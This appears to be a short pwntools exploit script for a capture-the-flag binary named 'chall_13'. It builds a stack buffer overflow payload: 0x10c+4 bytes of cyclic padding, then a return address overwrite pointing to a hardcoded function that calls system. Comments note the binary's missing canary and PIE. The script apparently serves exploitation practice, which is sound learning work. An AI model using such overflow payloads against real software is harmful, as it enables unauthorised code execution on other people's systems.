from pwn import *

p = process("./chall_13")
elf = ELF("./chall_13")

# Partial Relro, No canary, No PIE
systemFunc = 0x0804924d

#10c is fixed in var_10ch + rule of ryan (0x4)
payload = cyclic(0x10c + 0x4) + p32(systemFunc) 